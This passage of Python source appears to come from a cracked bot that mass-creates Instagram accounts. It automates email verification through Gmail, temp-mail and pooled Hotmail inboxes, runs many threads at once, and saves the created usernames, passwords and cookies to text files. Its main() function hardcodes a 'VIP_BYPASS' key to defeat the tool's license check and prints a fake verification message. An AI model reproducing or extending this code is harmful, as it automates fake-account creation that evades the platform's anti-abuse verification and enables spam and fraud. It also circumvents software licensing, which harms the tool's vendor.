                    line = f"{account_data['email']}|{account_data['username']}|{account_data['password']}|{account_data['user_agent']}|{account_data['cookies']}\n"
                    f.write(line)

                # 3. user_pass.txt (NEW FEATURE)
                with open(os.path.join(OUTPUT_DIR, "user_pass.txt"), "a", encoding="utf-8") as f:
                    line = f"{account_data['username']} {account_data['password']}\n"
                    f.write(line)
                    
                console.print(f"[dim]💾 Account details saved to text files in {OUTPUT_DIR}.[/dim]")
            except Exception as e:
                console.print(f"[red]❌ Error saving account details: {e}[/red]")
    
    def display_success(self, account_data):
        console.print(f"\n[bold green]✅ Account Created Successfully![/bold green]")
        console.print(f"[bold cyan]👤 Username:[/bold cyan] {account_data['username']}")
        console.print(f"[bold magenta]🔑 Password:[/bold magenta] {account_data['password']}")
        console.print(f"[bold yellow]📁 Saved to:[/bold yellow] {OUTPUT_DIR}accounts.txt, full_data.txt & user_pass.txt\n")
    
    def create_instagram_account_with_gmail(self):
        email_address = self.setup_gmail()
        if not email_address:
            return False
        
        if not self.check_email_availability(email_address):
            return False
        
        if not self.send_verification_email(email_address):
            return False
        
        msg_id = self.gmail_service.poll_for_instagram_message()
        if not msg_id:
            return False
        
        content = self.gmail_service.fetch_message_content(msg_id)
        if not content:
            console.print("[red]❌ Failed to fetch message content.[/red]")
            return False
        
        code = self.gmail_service.parse_confirmation_code(content)
        if not code:
            console.print("[red]❌ Verification code not found in message.[/red]")
            return False
        
        console.print(f"[green]🔑 Code retrieved: {code}[/green]")
        
        signup_code = self.verify_code(email_address, code)
        if not signup_code:
            return False
        
        success = self.create_account(email_address, signup_code)
        self.gmail_service.close()
        return success
    
    def create_instagram_account_with_temp_email(self):
        self.email_service = TempEmailService()
        temp_email = self.email_service.create_temp_email()
        if not temp_email:
            return False
        
        if not self.check_email_availability(temp_email):
            return False
        
        if not self.send_verification_email(temp_email):
            return False
        
        msg_id = self.email_service.poll_for_message()
        if not msg_id:
            return False
        
        html_content = self.email_service.fetch_full_message(msg_id)
        if not html_content:
            console.print("[red]❌ Failed to fetch message content.[/red]")
            return False
        
        code = self.email_service.parse_confirmation_code(html_content)
        if not code:
            console.print("[red]❌ Verification code not found in message.[/red]")
            return False
        
        console.print(f"[green]🔑 Code retrieved: {code}[/green]")
        
        signup_code = self.verify_code(temp_email, code)
        if not signup_code:
            return False
        
        return self.create_account(temp_email, signup_code)
    

    def create_instagram_account_with_hotmail(self):
        email_dict = HotmailService.get_and_lock_email()
        if not email_dict:
            console.print("[yellow]⏳ Waiting for a free Hotmail account...[/yellow]")
            for _ in range(15):
                time.sleep(2)
                email_dict = HotmailService.get_and_lock_email()
                if email_dict: break
            
            if not email_dict:
                console.print("[red]❌ No available Hotmail accounts right now.[/red]")
                return False
                
        try:
            line_data = email_dict['line']
            self.hotmail_service = HotmailService()
            if not self.hotmail_service.setup(line_data):
                return False
                
            email_address = self.hotmail_service.email
            console.print(f"[green]✅ Using Exclusively Locked Hotmail: {email_address}[/green]")
            
            if not self.check_email_availability(email_address):
                return False
                
            max_otp_cycles = 3 
            signup_code = None
            
            for cycle in range(max_otp_cycles):
                if not self.send_verification_email(email_address):
                    console.print(f"[yellow]⚠️ Could not send verification email (Cycle {cycle+1}). Retrying...[/yellow]")
                    time.sleep(5)
                    continue
                
                console.print(f"[blue]⏳ Waiting for a NEW OTP for {email_address} (Cycle {cycle+1})...[/blue]")
                code = self.hotmail_service.get_code(retries=12, wait_seconds=5)
                
                if not code:
                    console.print("[yellow]⚠️ Timeout waiting for a new OTP. Triggering resend...[/yellow]")
                    continue
                
                console.print(f"[green]🔑 Code retrieved: {code}[/green]")
                signup_code = self.verify_code(email_address, code)
                
                if signup_code:
                    break 
                else:
                    console.print(f"[yellow]⚠️ Verification failed with code {code}. Retrying to get a new code...[/yellow]")
            
            if not signup_code:
                console.print("[red]❌ Max OTP cycles reached. Could not verify email.[/red]")
                return False
            
            return self.create_account(email_address, signup_code)
        
        finally:
            HotmailService.release_email(email_dict)
    

    def create_instagram_account_manually(self):
        console.print("\n[bold cyan]🔧 Manual Account Creation[/bold cyan]")
        identity = Prompt.ask("- Enter Email or Phone Number")
        
        is_phone = "@" not in identity
        
        if is_phone:
            if not self.check_phone_availability(identity):
                if not Confirm.ask("[yellow]⚠️ Phone might be used or invalid. Continue anyway?[/yellow]"):
                    return False
        else:
            if not self.check_email_availability(identity):
                if not Confirm.ask("[yellow]⚠️ Email might be used or invalid. Continue anyway?[/yellow]"):
                    return False
        
        if is_phone:
            if not self.send_verification_sms(identity):
                if not Confirm.ask("[yellow]⚠️ Failed to send SMS automatically. Did you receive it manually? Continue?[/yellow]"):
                    return False
        else:
            if not self.send_verification_email(identity):
                if not Confirm.ask("[yellow]⚠️ Failed to send Email OTP automatically. Did you receive it manually? Continue?[/yellow]"):
                    return False
        
        code = Prompt.ask("[bold green]📩 Enter the Verification Code (OTP) you received[/bold green]")
        if not code:
            console.print("[red]❌ No code entered.[/red]")
            return False
        
        if is_phone:
            signup_code = self.verify_sms_code(identity, code)
        else:
            signup_code = self.verify_code(identity, code)
            
        if not signup_code:
            if not Confirm.ask("[yellow]⚠️ Code verification failed. Try to create account anyway?[/yellow]"):
                return False
            signup_code = code
        
        return self.create_account(identity, signup_code)


    def process_single_account(self, index, total, email_type):
        creator = InstagramCreator()
        time.sleep(random.uniform(0.1, 0.5))
        
        console.print(f"\n[bold yellow]➡️ Thread {index+1} started[/bold yellow]")
        
        success = False
        try:
            if email_type == "gmail":
                success = creator.create_instagram_account_with_gmail()
            elif email_type == "hotmail":
                success = creator.create_instagram_account_with_hotmail()
            elif email_type == "manual":
                success = creator.create_instagram_account_manually()
            else:
                success = creator.create_instagram_account_with_temp_email()
            
            with InstagramCreator.stats_lock:
                if success:
                    InstagramCreator.success_count += 1
                else:
                    InstagramCreator.fail_count += 1
                
                remain = InstagramCreator.total_target - (InstagramCreator.success_count + InstagramCreator.fail_count)
                
                console.print(f"[bold magma]📊 STATS:[/bold magma] [green]✅ OK: {InstagramCreator.success_count}[/green] |[red]❌ Fail: {InstagramCreator.fail_count}[/red] |[yellow]⏳ Remain: {remain}[/yellow]")
                
            return success
                
        except Exception as inner_e:
            console.print(f"[red]❌ Error processing account {index+1}: {repr(inner_e)}[/red]")
            
            with InstagramCreator.stats_lock:
                InstagramCreator.fail_count += 1
                remain = InstagramCreator.total_target - (InstagramCreator.success_count + InstagramCreator.fail_count)
                console.print(f"[bold magma]📊 STATS:[/bold magma][green]✅ OK: {InstagramCreator.success_count}[/green] | [red]❌ Fail: {InstagramCreator.fail_count}[/red] | [yellow]⏳ Remain: {remain}[/yellow]")
            
            return False

    def run(self):
        try:
            email_type = self.get_email_choice()
            
            self.setup_ua_source()
            
            if email_type == "hotmail":
                HotmailService.load_emails()
                available_hotmails = len(HotmailService.emails_list)
                if available_hotmails == 0:
                    console.print("[red]❌ No Hotmail accounts available in hotmails.txt. Exiting.[/red]")
                    return
            
            while True:
                try:
                    count_str = Prompt.ask("- How many accounts do you want to create?")
                    count = int(count_str)
                    if count > 0:
                        break
                    console.print("[red]Please enter a valid number greater than 0[/red]")
                except ValueError:
                    console.print("[red]Invalid input. Please enter a number.[/red]")
            
            InstagramCreator.total_target = count
            InstagramCreator.success_count = 0
            InstagramCreator.fail_count = 0
            
            if email_type == "manual":
                max_threads = 1
                console.print("[yellow]ℹ️ Manual mode detected. Threading disabled to allow manual input.[/yellow]")
            else:
                while True:
                    max_threads_str = Prompt.ask("- How many concurrent threads? (Recommended: 3-5)", default="3")
                    try:
                        max_threads = int(max_threads_str)
                        if max_threads <= 0:
                            console.print("[red]Please enter a valid number greater than 0[/red]")
                            continue
                        
                        # Restricting Max Threads for Hotmail to prevent queue deadlocks
                        if email_type == "hotmail":
                            available_hotmails = len(HotmailService.emails_list)
                            if max_threads > available_hotmails:
                                console.print(f"[yellow]⚠️ You only have {available_hotmails} hotmail(s). Threads cannot exceed available hotmails. Auto-adjusting to {available_hotmails} thread(s).[/yellow]")
                                max_threads = available_hotmails
                        break
                    except ValueError:
                        console.print("[red]Invalid input. Please enter a number.[/red]")
            
            console.print(f"\n[bold green]🚀 Starting creation of {count} accounts with {max_threads} threads...[/bold green]\n")
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
                futures =[]
                for i in range(count):
                    futures.append(executor.submit(self.process_single_account, i, count, email_type))
                
                for future in concurrent.futures.as_completed(futures):
                    pass 
            
            console.print(f"\n[bold green]✅ All requested accounts processed![/bold green]")
            console.print(f"[bold magma]📊 Final Stats:[/bold magma] [green]✅ OK: {InstagramCreator.success_count}[/green] | [red]❌ Fail: {InstagramCreator.fail_count}[/red]")
                
        except KeyboardInterrupt:
            console.print("\n[red]🛑 You stopped the tool..[/red]")
        except Exception as e:
            console.print(f"\n[red]❌ Unknown error: {e}[/red]")

def main():
    console.print("[bold cyan]🤖 Instagram Account Creator - Updated Version (Bypassed)[/bold cyan]")
    
    # --- LICENSE BYPASSED ---
    global USER_LICENSE_KEY, LICENSE_EXPIRE_DATE, USER_FOLDER_NAME
    USER_LICENSE_KEY = "VIP_BYPASS"
    LICENSE_EXPIRE_DATE = "Lifetime"
    USER_FOLDER_NAME = "Admin"

    print("License Verified! Valid until: Lifetime")
    print("Logged in as: VIP User (Bypassed)\n")

    creator = InstagramCreator()
    creator.run()

if __name__ == "__main__":
    main()
